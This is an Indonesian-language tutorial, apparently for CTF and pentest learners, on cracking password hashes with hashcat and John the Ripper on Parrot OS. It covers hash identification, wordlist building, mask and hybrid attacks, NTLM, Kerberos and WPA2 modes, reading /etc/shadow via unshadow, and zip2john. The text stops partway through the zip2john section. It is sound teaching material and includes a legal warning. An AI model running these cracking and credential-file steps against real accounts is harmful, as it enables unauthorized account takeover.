---
id: "63"
title: "⚡ Quick Start: Urutan Kerja Password Cracking (Untuk Pemula)"
category: "9. OSINT & Misc"
categoryId: "osint_misc"
filename: "63_password_cracking_workflow.md"
refs_out: ["01","05","06","14b","35","37","45","55","62"]
refs_in: ["04","19","36","53","62","64"]
---

> **Target Environment:** Parrot OS XFCE (Debian-based)  
> **Prerequisites:** Memahami dasar Linux CLI, file permissions, dan inspeksi biner dasar (referensi: [01. Mindset, Metodologi, dan Workflow Pentesting — Panduan Fundamental](/docs/mindset-dan-metodologi), [🧭 BAGIAN 0: FONDASI FORENSICS](/docs/forensics)).  
> **Fokus Utama:** Identifikasi tipe hash, strategi wordlist, serangan mutasi rules, komputasi cracking via Hashcat & John the Ripper, ekstraksi hash format file, serta metodologi pemecahan tantangan CTF dan audit keamanan kredensial legal.

---

## 📑 Daftar Isi

1. [Bagian 0: Fondasi Password Cracking](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-0-fondasi-password-cracking)
2. [Bagian 1: Identifikasi Hash (Manual & Otomatis)](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-1-identifikasi-hash)
3. [Bagian 2: Wordlist & Custom Dictionary Engineering](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-2-wordlist--custom-dictionary-engineering)
4. [Bagian 3: Hashcat Workflow & Attack Modes](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-3-hashcat-workflow)
5. [Bagian 4: John the Ripper Workflow & File Formats](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-4-john-the-ripper-workflow)
6. [Bagian 5: Credential Extraction (Dari Mana Hash Berasal)](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-5-credential-extraction)
7. [Bagian 6: Online Cracking Resources](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-6-online-cracking-resources)
8. [Bagian 7: Cracking Strategy Decision Tree](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-7-cracking-strategy-decision-tree)
9. [Bagian 8: 8 Common CTF Password Cracking Patterns](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-8-8-common-ctf-password-cracking-patterns)
10. [Bagian 9: Performance Optimization (VM & CPU Tuning)](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-9-performance-optimization)
11. [Bagian 10: Common Errors & Troubleshooting](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-10-common-errors--troubleshooting)
12. [Bagian 11: Cheatsheet Copy-Paste Ready](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-11-cheatsheet-copy-paste-ready)

---

## ⚡ Quick Start: Urutan Kerja Password Cracking (Untuk Pemula)

[ ] 1. **Dapat Hash → Identifikasi Tipe Hash Dulu:**
       `nth --text 'HASH_STRING'` atau `hashid -m -j 'HASH_STRING'`

[ ] 2. **Coba Online Lookup Dulu (Hemat Waktu & Resource):**
       Uji di [CrackStation.net](https://crackstation.net/) atau [Hashes.com](https://hashes.com/)

[ ] 3. **Jika Gagal → Uji Dictionary Baseline (`rockyou.txt`):**
       `hashcat -m MODE hash.txt /usr/share/wordlists/rockyou.txt --force -O`

[ ] 4. **Jika Masih Gagal → Tambahkan Mutation Rules:**
       `hashcat -m MODE hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`

[ ] 5. **Password Terproteksi Format File (ZIP/SSH/PDF/KDBX)?**
       Ekstrak salt hash: `zip2john secret.zip > hash.txt` lalu `john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`

[ ] 6. **Lihat Hasil Cracking (Potfile):**
       `hashcat -m MODE hash.txt --show` atau `john hash.txt --show`

---

## 🔐 Bagian 0: Fondasi Password Cracking

### 0.1 Bagaimana Password Disimpan

Dalam arsitektur modern yang aman, sistem operasi, database, dan aplikasi web **tidak pernah menyimpan password dalam bentuk plaintext**. Menyimpan plaintext merupakan risiko fatal: jika database bocor, seluruh akun seketika terkompromi.

> **Analogi Sederhana untuk Pemula:**  
> Password diibaratkan **manusia**, sedangkan hash adalah **sidik jarinya**.  
> Sistem otentikasi tidak menyimpan tubuh manusia di dalam lemari besi database; sistem hanya mencatat cetakan sidik jarinya. Ketika pengguna ingin masuk, sistem mengambil sidik jari dari input yang baru dimasukkan, lalu membandingkannya dengan sidik jari yang tersimpan. Jika cetakannya identik, akses diberikan.

text

```
                      ALUR VERIFIKASI LOGIN BERBASIS HASH
 [ Registrasi ]
  User Input: "P@ssw0rd123" ──► [ One-Way Hash Function ] ──► Simpan: "5e884898da28..."
                                       (SHA-256)                   (Database / SAM)

 [ Verifikasi Login ]
  User Input: "P@ssw0rd123" ──► [ One-Way Hash Function ] ──► "5e884898da28..."
                                       (SHA-256)                    │
                                                                    ▼
                                                             [ Bandingkan? ]
                                                      Identik = Login Diterima (200 OK)
                                                      Berbeda = Login Ditolak  (401 Unauthorized)
```

#### Kenapa Hash Tidak Bisa Di-reverse (Didekripsi)?

Fungsi hash kriptografis bersifat **satu arah matematis** (_one-way mathematical function_). Proses komputasi hash melibatkan operasi kompresi data, modulo, bitwise shifting, dan non-linear transformations yang secara sengaja membuang informasi panjang asli dari input. Mengubah hash kembali ke teks aslinya secara aljabar mustahil dilakukan.

#### Kenapa Password Cracking Bisa Berhasil?

Cracking bukan membalikkan rumus hash, melainkan **menebak input secara massal**. Penyerang mengambil kandidat kata dari kamus (_dictionary_), menghitung nilai hash kandidat tersebut menggunakan algoritma yang sama, lalu membandingkan hasilnya dengan hash target:

- **Dictionary Attack:** Menguji kata-kata yang umum digunakan manusia dari daftar kebocoran nyata (_wordlist_).
- **Brute Force Attack:** Menghitung secara matematis seluruh kemungkinan kombinasi karakter (misal: aaaa, aaab ... zzzz). Sangat lambat untuk password panjang.
- **Rule-based Attack:** Memodifikasi kata dasar dari kamus secara dinamis berdasarkan perilaku psikologis manusia (contoh: mengubah huruf menjadi angka/leetspeak, menambah tahun di akhir: `admin` →→ `Admin2024!`).
- **Rainbow Tables:** Menggunakan tabel referensi _precomputed hashes_ yang telah dihitung sebelumnya untuk mencari pasangan plaintext secara instan. Teknik ini hanya efektif pada hash tanpa salt (_unsalted_).

---

### 0.2 Terminologi Penting

- **Hash:** String heksadesimal dengan panjang karakter tetap (_fixed-length_) hasil komputasi fungsi kriptografis dari input dengan panjang sembarang.
- **Salt:** Rangkaian byte acak (_random string_) yang ditambahkan ke password sebelum diproses oleh fungsi hash.  
    Hash=Algorithm(Password+Salt)Hash=Algorithm(Password+Salt)  
    _Tujuan Salt:_ Menjamin bahwa dua user yang memiliki password identik akan menghasilkan nilai hash yang sama sekali berbeda di database. Hal ini membuat teknik _Rainbow Tables_ menjadi tidak berguna.
- **Pepper:** Nilai rahasia tambahan yang digabungkan dengan password tetapi **disimpan di tempat terpisah dari database** (misal: di dalam file konfigurasi server atau Hardware Security Module / HSM).
- **Iteration / Cost Factor / Rounds:** Jumlah pengulangan kalkulasi fungsi hash secara sengaja (contoh: pada `bcrypt`, `PBKDF2`, `Argon2`). Semakin tinggi cost factor, semakin berat beban CPU/GPU untuk menghitung satu hash, sehingga memperlambat serangan brute force jutaan kali lipat.
- **Wordlist vs Dictionary:** Keduanya sering disamakan. Secara teknis, _dictionary_ berisi kata-kata bahasa alami (Inggris, Indonesia, dll.), sedangkan _wordlist_ berisi kumpulan password nyata dari berbagai insiden kebocoran data di internet (memuat angka, kombinasi typo, dan simbol).
- **Rule:** Perintah transformasi matematis/logika string yang diterapkan pada setiap kata dalam wordlist saat cracking berjalan secara _on-the-fly_.

---

### 0.3 Konteks Etis & Hukum

> **PERINGATAN OPERASIONAL:**  
> Melakukan cracking terhadap hash yang didapatkan dari sistem tanpa otorisasi tertulis (_written permission_) adalah tindakan ilegal yang melanggar hukum siber (UU ITE di Indonesia, Computer Fraud and Abuse Act di AS).
> 
> **Cracking hanya legal dalam:**
> 
> 1. Lingkungan kompetisi Capture The Flag (CTF) yang terisolasi.
> 2. Penugasan penetration testing resmi dengan cakupan (_scope of work_) yang disepakati klien.
> 3. Audit kepatuhan internal (_password policy auditing_) oleh administrator sistem.
> 
> Hash yang diekstraksi selama engagement pentest adalah **data rahasia klien (Evidence)**. Simpan di direktori terenkripsi dan musnahkan setelah laporan selesai diserahkan.

---

## 🛠️ Setup Tools di Parrot OS

Parrot OS Security Edition sudah menyertakan utility dasar berikut secara pre-installed:
- `hashcat` (GPU/CPU hash cracker)
- `john` (John the Ripper)
- `zip2john`, `rar2john`, `ssh2john`, `pdf2john`, `keepass2john`
- `rockyou.txt` (terkompresi di `/usr/share/wordlists/rockyou.txt.gz`)

### Instalasi Tools Tambahan

Jalankan perintah berikut untuk melengkapi toolkit password cracking:

Bash

```bash
# 1. Identifikator Hash
sudo apt install -y hashid
pip3 install name-that-hash --break-system-packages

# 2. Generator Wordlist & Custom Dictionary
sudo apt install -y cewl crunch seclists

# 3. Sanitasi Newline Windows CRLF
sudo apt install -y dos2unix

# 4. Verifikasi Kesiapan Tools
for tool in hashcat john hashid nth cewl crunch dos2unix ssh2john zip2john; do
  which $tool >/dev/null 2>&1 && echo -e "$tool \t: [ OK ]" || echo -e "$t \t: [ NOT FOUND ]"
done
```

---

## 📄 Format File Hash untuk Hashcat

**PENTING:** Hashcat membaca file `hash.txt` dengan aturan format spesifik tergantung algoritma:

1. **Format Standar Unsalted (1 hash per baris):**
   ```text
   5f4dcc3b5aa765d61d8327deb882cf99
   827ccb0eea8a706c4c34a16891f84e7b
   ```
2. **Format NTLM dari Secretsdump (`secretsdump.py`):**
   ```text
   Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
   ```
   *Aturan:* Hashcat hanya membutuhkan NThash 32-hex di kolom ke-4 (`31d6cfe0d16ae931b73c59d7e0c089c0`) untuk mode `-m 1000`.
3. **Format NetNTLMv2 / Responder Capture (SELURUH Baris):**
   ```text
   admin::CORP:1122334455667788:B92C...:0101...
   ```
   *Aturan:* Copy-paste **SELURUH** baris mentah tanpa memotong bagian mana pun.
4. **Format Linux Shadow (`/etc/shadow`):**
   ```text
   $6$rounds=5000$saltsalt$wAmZ1c8G18Z8F1...
   ```
   *Aturan:* Paste baris entri hash lengkap mulai dari `$1$`, `$5$`, atau `$6$`.

---

## 🔎 Bagian 1: Identifikasi Hash

### 1.1 Mengapa Identifikasi Hash Penting?

Hashcat dan John the Ripper memerlukan parameter algoritma yang tepat untuk mengalokasikan kernel komputasi GPU/CPU.  
Jika Anda salah mengidentifikasi sebuah hash SHA-256 sebagai NTLM, Hashcat akan menjalankan kalkulasi algoritma yang salah, sehingga **tingkat keberhasilan cracking akan selalu 0%** meskipun password aslinya ada di baris pertama wordlist.

---

### 1.2 Karakteristik & Tabel Identifikasi Hash Manual

|Tipe Hash|Panjang Karakter|Format Karakter|Contoh Realistis|Hashcat Mode (`-m`)|John Format (`--format`)|
|---|---|---|---|---|---|
|**MD5**|32 hex|`[0-9a-f]{32}`|`5f4dcc3b5aa765d61d8327deb882cf99`|`0`|`raw-md5`|
|**NTLM**|32 hex|`[0-9a-f]{32}` (Case-insensitive)|`cc32dc96700e8284e0302b1eb329a278`|`1000`|`nt`|
|**LM**|32 hex|Dua blok 16-hex terpisah|`aad3b435b51404eeaad3b435b51404ee`|`3000`|`lm`|
|**SHA-1**|40 hex|`[0-9a-f]{40}`|`2fd4e1c67a2d28fced849ee1bb76e7391b93eb12`|`100`|`raw-sha1`|
|**SHA-256**|64 hex|`[0-9a-f]{64}`|`ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f`|`1400`|`raw-sha256`|
|**SHA-512**|128 hex|`[0-9a-f]{128}`|`9b71d224bd62f3785d96d46ad3ea3d73319bf52101926042a3e08f4736b42...`|`1700`|`raw-sha512`|
|**MySQL 4.1+**|40 hex|`*[0-9A-F]{40}`|`*6C898D34C322F69269DFE0327C23537E99A025B1`|`300`|`mysql-sha1`|
|**MD5crypt**|Varies|Prefix `$1$`|`$1$O3tz.n4g$mZ12.rF0vD7Vf1oY65K4V/`|`500`|`md5crypt`|
|**SHA256crypt**|Varies|Prefix `$5$`|`$5$rounds=5000$usesomeothersalt$8vjp2...`|`7400`|`sha256crypt`|
|**SHA512crypt**|Varies|Prefix `$6$`|`$6$saltstring$92/Rlaq...`|`1800`|`sha512crypt`|
|**yescrypt**|Varies|Prefix `$y$`|`$y$j9T$saltstring$hashstring...`|`N/A` (Custom)|`crypt`|
|**bcrypt**|60 chars|Prefix `$2a$`, `$2b$`, `$2y$`|`$2a$12$e8N8qKhqOmgG.kX8V3qCde2uW8jLqY3J4bWJ5H7Z0xX.wW7Y.5K9G`|`3200`|`bcrypt`|
|**NetNTLMv2**|Varies|`User::Domain:Challenge:Hash`|`admin::CORP:1122334455667788:B92C...`|`5600`|`netntlmv2`|
|**Kerberos 5**|Varies|`$krb5tgs$23$...`|`$krb5tgs$23$*user$realm$test/spn*$a1b2...`|`13100`|`krb5tgs`|
|**WPA/WPA2**|Varies|Format PMKID / 4-Way EAPOL|`WPA*02*4d53...` (File `.hc22000`)|`22000`|`wpapsk`|
|**PostgreSQL**|35 chars|Prefix `md5` + 32-hex|`md539b0a5c441113e155bc81cd0bb8a7e02`|`N/A` (MD5 Custom)|`postgres`|
|**MSSQL (2012+)**|140 hex|Prefix `0x0200` + 128-hex|`0x020054E9...`|`1731`|`ms-sql08`|

---

### 1.3 Tools Identifikasi Hash Otomatis

Parrot OS menyediakan sejumlah utility untuk mendeteksi tipe algoritma dari sebuah hash yang tidak diketahui:

Bash

```
# 1. Menggunakan 'hashid' (Pre-installed di Parrot OS)
# Flag -m menampilkan ID mode Hashcat, flag -j menampilkan format John the Ripper
hashid -m -j '5f4dcc3b5aa765d61d8327deb882cf99'
```

_Contoh Output Nyata:_

text

```
Analyzing '5f4dcc3b5aa765d61d8327deb882cf99'
[+] MD5 [Hashcat Mode: 0] [John the Ripper: raw-md5]
[+] NTLM [Hashcat Mode: 1000] [John the Ripper: nt]
[+] MD4 [Hashcat Mode: 900] [John the Ripper: raw-md4]
```

Bash

```
# 2. Menggunakan 'Name-That-Hash' (nth) - Tool modern berbasis heuristic
pip3 install name-that-hash --break-system-packages

# Analisis single hash
nth --text 'ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f'

# Analisis batch file berisi banyak hash
nth --file target_hashes.txt
```

_Contoh Output Nyata:_

text

```
Hash: ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f
Most Likely:
[+] SHA-256 (Hashcat Mode: 1400, John: raw-sha256)
[+] Haval-256
```

#### Aturan Identifikasi Mandiri Berdasarkan Prefix `$X$`:

Sistem operasi Linux modern menyimpan hash pada file `/etc/shadow` dengan penanda prefix standar:

- `$1$` : **MD5-crypt** (Algoritma lama, sangat cepat di-crack).
- `$2a$` / `$2b$` / `$2y$` : **bcrypt** (Fungsi hashing adaptif, sangat lambat dan aman).
- `$5$` : **SHA-256 crypt** (Standar distribusi lawas).
- `$6$` : **SHA-512 crypt** (Standar default mayoritas distribusi Debian/Ubuntu/RHEL).
- `$y$` : **yescrypt** (Standar default sistem Linux modern terbaru berbasis Debian 12 / Parrot 6).

---

## 📚 Bagian 2: Wordlist & Custom Dictionary Engineering

### 2.1 Mengapa `rockyou.txt` Selalu Menjadi Pilihan Pertama?

Pada tahun 2009, perusahaan media sosial bernama **RockYou** mengalami insiden kebocoran data di mana basis data mereka yang memuat lebih dari 32 juta kata sandi plaintext berhasil diekstraksi. Peneliti membersihkan data tersebut dan merilisnya sebagai wordlist `rockyou.txt` (~14.3 juta password unik).

> **Alasan Ilmiah Pemilihan `rockyou.txt` di CTF:**
> 
> 1. **Representasi Psikologi Manusia:** Memuat distribusi kata, pola substitusi karakter, dan angka berurutan yang paling sering dipilih manusia secara global.
> 2. **Efisiensi Waktu & Ukuran:** Berukuran ~134 MB (uncompressed), cukup ringkas untuk dimuat ke RAM GPU/CPU secara instan, namun mencakup lebih dari 80% password level pemula-menengah di HackTheBox dan TryHackMe.

Bash

```
# Menyiapkan rockyou.txt di Parrot OS (Terkompresi secara default)
cd /usr/share/wordlists/
if [ -f rockyou.txt.gz ] && [ ! -f rockyou.txt ]; then
    echo "[*] Mengekstrak rockyou.txt..."
    sudo gunzip -k rockyou.txt.gz
fi
wc -l /usr/share/wordlists/rockyou.txt
# Output: 14344392 baris
```

---

### 2.2 Tabel Wordlist Populer & Skenario Penggunaan

|Wordlist|Jumlah Baris / Ukuran|Skenario Penggunaan Pentest & CTF|
|---|---|---|
|`rockyou.txt`|14.3 Juta (134 MB)|**Default Baseline.** Selalu dicoba pertama kali pada CTF dan pentest internal.|
|`darkweb2017-top10000.txt`|10.000 (100 KB)|**Quick Triage.** Uji coba instan (<5 detik) sebelum menjalankan wordlist besar.|
|`SecLists/Passwords/Common-Credentials/`|Bervariasi|**Password Spraying.** Menargetkan kredensial default sistem IT, router, dan DB.|
|`kaonashi.txt`|63 Juta (600 MB)|**Advanced CTF.** Digunakan saat rockyou gagal, memuat banyak kombinasi regional Asia.|
|`xato-net-10-million-passwords.txt`|10 Juta (95 MB)|Alternatif komparatif terhadap rockyou untuk lingkungan korporat Barat.|

Instalasi SecLists di Parrot OS jika belum ada:

Bash

```
sudo apt install -y seclists
ls -la /usr/share/seclists/Passwords/
```

---

### 2.3 Rekayasa Wordlist Kustom (Custom Dictionary)

Ketika password target menggunakan istilah internal organisasi yang tidak ada di `rockyou.txt`, gunakan metode pembuatan kamus terarah:

#### 1. Web Scraping Menggunakan CeWL

CeWL (_Custom Word List generator_) melakukan spidering pada website target untuk mengumpulkan seluruh terminologi spesifik perusahaan:

Bash

```
# Crawling web target sedalam 2 level (-d 2), kata minimal 6 karakter (-m 6)
cewl https://insecurebank.com -d 2 -m 6 -w /tmp/target_cewl.txt
echo "[+] Total kata dari web: $(wc -l < /tmp/target_cewl.txt)"
```

#### 2. Profiling Social Engineering Menggunakan CUPP

CUPP (_Common User Passwords Profiler_) membuat wordlist berbasis profil personal target (nama pasangan, tanggal lahir, nama hewan peliharaan, hobi):

Bash

```
# Clone dan jalankan CUPP secara interaktif
git clone https://github.com/Mebus/cupp.git /tmp/cupp
python3 /tmp/cupp/cupp.py -i
# Jawab pertanyaan profiling target -> Output: nama_target.txt
```

#### 3. Pembangkitan Pola Brute Force Menggunakan Crunch

Jika format password diketahui sebagian (misal: kata "bank" + 1 huruf kecil + 3 angka):

- `@` : Huruf kecil (`a-z`)
- `%` : Angka (`0-9`)
- `,` : Huruf besar (`A-Z`)
- `^` : Simbol khusus (`!"#$%...`)

Bash

```bash
# Membuat password panjang 8 karakter dengan pola "bank" + 1 huruf kecil + 3 angka (-t bank@%%%)
# Sintaks: crunch <min> <max> [charset] -t <pattern>
crunch 8 8 -t bank@%%% -o /tmp/crunch_passwords.txt
# Menghasilkan: banka000, banka001 ... bankz999

# Contoh lain: "bank" + 2 angka (-t bank%%) -> panjang 6
crunch 6 6 -t bank%% -o /tmp/crunch_passwords.txt
# Menghasilkan: bank00, bank01 ... bank99
```

---

## ⚡ Bagian 3: Hashcat Workflow & Attack Modes

### 3.1 Anatomi Perintah Hashcat

Hashcat adalah tool password recovery berbasis GPGPU (_General-Purpose computing on Graphics Processing Units_) tercepat di dunia.

Format Perintah: hashcat [options] -m <MODE> -a <ATTACK_MODE> <HASH_FILE> <WORDLIST/MASK>Format Perintah: hashcat [options] -m <MODE> -a <ATTACK_MODE> <HASH_FILE> <WORDLIST/MASK>

text

```
 ┌───────────────┬────────────────────────────────────────────────────────────────────────┐
 │ Parameter     │ Fungsi Operasional                                                     │
 ├───────────────┼────────────────────────────────────────────────────────────────────────┤
 │ -m <mode>     │ Menentukan jenis algoritma hash (-m 0 = MD5, -m 1000 = NTLM).          │
 │ -a <attack>   │ Menentukan mode serangan (0=Straight, 3=Mask/Brute, 6=Hybrid).         │
 │ -w <1-4>      │ Workload profile (1=Low/Desktop, 2=Default, 3=Performance, 4=Headless).│
 │ -O            │ Mengaktifkan Optimized OpenCL/CUDA Kernels (Maksimal panjang pass: 32).│
 │ -r <rule>     │ Menerapkan file mutasi rule terhadap wordlist.                         │
 │ -o <file>     │ Menyimpan hasil password yang berhasil dipecahkan ke file teks.        │
 │ --show        │ Membaca potfile untuk menampilkan password yang SUDAH pernah di-crack. │
 │ --status      │ Menampilkan status performa secara berkala di layar terminal.          │
 │ --status-timer│ Interval update status (detik).                                        │
 │ --force       │ Mengabaikan peringatan environment (WAJIB digunakan jika di dalam VM). │
 └───────────────┴────────────────────────────────────────────────────────────────────────┘
```

> **CATATAN KRUSIAL UNTUK PENGGUNA VIRTUAL MACHINE (VM):**  
> Di dalam lingkungan virtual (VirtualBox / VMware) pada Parrot OS, Hashcat tidak dapat mengakses GPU fisik secara _direct hardware passthrough_, sehingga akan menggunakan OpenCL CPU runtime. Hashcat akan mengeluarkan pesan peringatan atau menolak berjalan. **Tambahkan selalu flag `--force` di setiap eksekusi Hashcat di dalam VM.**

---

### 3.2 Attack Mode 0: Dictionary Attack

Mode dasar yang membaca setiap baris kata dari wordlist tanpa modifikasi.

Bash

```
# Simpan hash target ke file
echo "5f4dcc3b5aa765d61d8327deb882cf99" > /tmp/hash.txt

# Eksekusi Dictionary Attack dengan rockyou.txt pada mode 0 (MD5)
hashcat -m 0 -a 0 /tmp/hash.txt /usr/share/wordlists/rockyou.txt --force -O -o /tmp/cracked.txt
```

_Contoh Output Nyata Hashcat:_

text

```
Host-memory required for this attack: 64 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507

5f4dcc3b5aa765d61d8327deb882cf99:password

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 5f4dcc3b5aa765d61d8327deb882cf99
Time.Started.....: Wed Oct 18 16:12:04 2023 (0 secs)
Time.Estimated...: Wed Oct 18 16:12:04 2023 (0 secs)
Speed.#1.........: 1845.2 kH/s (0.15ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
```

#### Apa Itu Hashcat Potfile?

Ketika Hashcat berhasil memecahkan sebuah hash, pasangan `hash:plain` disimpan secara otomatis ke dalam cache lokal: `~/.local/share/hashcat/hashcat.potfile`.  
Jika Anda menjalankan perintah cracking untuk kedua kalinya pada hash yang sama, Hashcat akan langsung berhenti dengan pesan: `All hashes found in potfile! Use --show to display them.`

Bash

```
# Tampilkan password dari potfile tanpa menghitung ulang:
hashcat -m 0 /tmp/hash.txt --show
# Output: 5f4dcc3b5aa765d61d8327deb882cf99:password

# Jika dalam skenario CTF Anda ingin mengukur waktu benchmark murni (Abaikan potfile):
hashcat -m 0 /tmp/hash.txt /usr/share/wordlists/rockyou.txt --potfile-disable --force
```

---

### 3.3 Attack Mode 0 dengan Mutation Rules

Aturan mutasi (_Rules_) mengambil setiap kata dari wordlist dan melakukan modifikasi cerdas:

- `$1` : Menambahkan karakter '1' di akhir kata (`admin` →→ `admin1`).
- `c` : Mengkapitalisasi huruf pertama (`admin` →→ `Admin`).
- `so0` : Mengganti huruf 'o' dengan angka '0' (`root` →→ `r00t`).

Bash

```
# Menggunakan best64.rule (Rule ringkas terbaik, 64 mutasi per kata)
hashcat -m 0 /tmp/hash.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule --force -O

# Menggunakan rockyou-30000.rule (Mutasi intensif untuk password kompleks)
hashcat -m 0 /tmp/hash.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

---

### 3.4 Attack Mode 3: Mask Attack (Brute Force Terarah)

Mask attack menggantikan brute force murni dengan membatasi ruang pencarian berdasarkan charset tertentu:

|Simbol Mask|Karakter yang Diwakili|
|---|---|
|`?l`|Huruf kecil (`abcdefghijklmnopqrstuvwxyz`)|
|`?u`|Huruf kapital (`ABCDEFGHIJKLMNOPQRSTUVWXYZ`)|
|`?d`|Angka (`0123456789`)|
|`?s`|Simbol khusus (`!"#$%&'()*+,-./:;<=>?@[\]^_`{|
|`?a`|Seluruh karakter printable (`?l?u?d?s`)|

Bash

```
# Skenario 1: PIN ATM 4 Digit Angka (?d?d?d?d) -> Hanya butuh waktu 0.01 detik
hashcat -m 0 /tmp/hash.txt -a 3 '?d?d?d?d' --force

# Skenario 2: Password 8 Karakter: Format Korporat (Kapital + 5 huruf kecil + 2 angka)
# Contoh: Adminaa01, P@sswd99
hashcat -m 0 /tmp/hash.txt -a 3 '?u?l?l?l?l?l?d?d' --force

# Skenario 3: Mode Increment (Mencoba panjang 1 hingga 6 karakter secara bertahap)
hashcat -m 0 /tmp/hash.txt -a 3 --increment --increment-min=1 --increment-max=6 '?l?d' --force
```

---

### 3.5 Attack Mode 6: Hybrid Attack (Wordlist + Mask)

Menggabungkan kata dasar dari kamus dan menyambungnya dengan pola mask:

Bash

```
# Menambahkan 4 digit angka di belakang kata dari wordlist (misal: password2024, dragon1234)
hashcat -m 0 /tmp/hash.txt -a 6 /usr/share/wordlists/rockyou.txt '?d?d?d?d' --force

# Mode 7 (Prefix Hybrid): Menambahkan 2 digit angka di DEPAN kata dari wordlist
hashcat -m 0 /tmp/hash.txt -a 7 '?d?d' /usr/share/wordlists/rockyou.txt --force
```

---

### 3.6 Mode Eksekusi Khusus untuk Hash Populer CTF

Bash

```
# 1. Windows NTLM Hash (Mode 1000)
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt --force -O

# 2. NetNTLMv2 Capture dari Responder (Mode 5600)
hashcat -m 5600 netntlmv2.txt /usr/share/wordlists/rockyou.txt --force

# 3. Kerberos 5 TGS Ticket dari Kerberoasting (Mode 13100)
hashcat -m 13100 krb5tgs.txt /usr/share/wordlists/rockyou.txt --force

# 4. bcrypt $2a$ / $2b$ (Mode 3200) - Wajib Workload Rendah (-w 1) agar sistem tidak freeze
hashcat -m 3200 bcrypt_hashes.txt /usr/share/wordlists/rockyou.txt -w 1 --force

# 5. Linux SHA-512 crypt /etc/shadow (Mode 1800)
hashcat -m 1800 shadow_hashes.txt /usr/share/wordlists/rockyou.txt --force -O

# 6. WPA2 WiFi Handshake / PMKID (Mode 22000)
hashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt --force
```

---

## 🔨 Bagian 4: John the Ripper Workflow & File Formats

### 4.1 John the Ripper vs Hashcat

|Parameter|Hashcat|John the Ripper (JtR)|
|---|---|---|
|**Akselerasi Utama**|**GPU (CUDA/OpenCL)** — Ekstrem cepat|**CPU multi-core** (Mendukung OpenCL parsial)|
|**Deteksi Hash**|Manual (Wajib menentukan mode `-m`)|**Otomatis** (Memeriksa signature string)|
|**Ekstraksi File Biner**|Tidak ada (Memerlukan konverter pihak ketiga)|**Unggul (Ekosistem suite `*2john` sangat luas)**|
|**Parsing /etc/shadow**|Memerlukan isolasi baris hash murni|Memproses via `unshadow` langsung|
|**Kapan Digunakan?**|Hash bervolume tinggi, NTLM dump, GPU ready|**Password file terenkripsi (ZIP, PDF, SSH, KDBX)**|

---

### 4.2 Penggunaan Dasar John the Ripper

Bash

```
# 1. Menjalankan cracking dengan auto-detection algoritma
john target_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# 2. Menentukan format secara manual (Mempercepat eksekusi)
john target_hash.txt --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt

# 3. Menampilkan hasil password yang telah terpecahkan
john target_hash.txt --show

# 4. Menggunakan Single Crack Mode (Memanfaatkan metadata username untuk menebak password)
john target_hash.txt --single
```

---

### 4.3 Cracking Linux `/etc/shadow` Menggunakan `unshadow`

Format file `/etc/shadow` tidak menyertakan nama user secara independen saat diparsing secara raw. Utilitas `unshadow` menggabungkan file `/etc/passwd` dan `/etc/shadow` menjadi satu format yang dikenali oleh John:

Bash

```
# 1. Gabungkan kedua file sistem
sudo unshadow /etc/passwd /etc/shadow > /tmp/unshadowed.txt

# 2. Eksekusi cracking menggunakan John
john /tmp/unshadowed.txt --wordlist=/usr/share/wordlists/rockyou.txt

# 3. Tampilkan seluruh password akun Linux yang berhasil di-crack
john /tmp/unshadowed.txt --show
```

_Contoh Output:_

text

```
victim:password123:1000:1000::/home/victim:/bin/bash
developer:letmein1:1001:1001::/home/developer:/bin/bash
2 password hashes cracked, 0 left
```

---

### 4.4 Cracking Format File Terproteksi (`*2john` Suite)

Dalam CTF Forensics dan Web Pentest, Anda sering menemukan file arsip, database password, atau private key yang terkunci. John the Ripper menyediakan parser biner `*2john` yang mengekstrak metadata enkripsi menjadi hash teks yang siap di-crack.

text

```
       WORKFLOW EKSTRAKSI DAN CRACKING FILE
 ┌──────────────────┐        ┌──────────────────┐        ┌──────────────────┐
 │ File Terproteksi │ ──►    │ Tool *2john      │ ──►    │ File Hash Teks   │
 │ (zip, pdf, id_rsa│        │ (Ekstraksi Salt) │        │ (Siap Dicrack)   │
 └──────────────────┘        └──────────────────┘        └────────┬─────────┘
                                                                  │
 ┌──────────────────┐                                             ▼
 │ Password Plain   │ ◄────────────────────────────────── [ John The Ripper ]
 └──────────────────┘
```

#### 1. Password-Protected ZIP Archive (`zip2john`)

Bash

```
# Ekstraksi hash dari file ZIP terenkripsi
zip2john secret.zip > /tmp/zip_hash.txt

# Jalankan cracking
john /tmp/zip_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john /tmp/zip_hash.txt --show
```

_Contoh Output Nyata:_

text

```
ver 2.0 efh 5455 secret.zip/flag.txt PKZIP Encr: cmplen=44, decmplen=32, crc=87A9E112
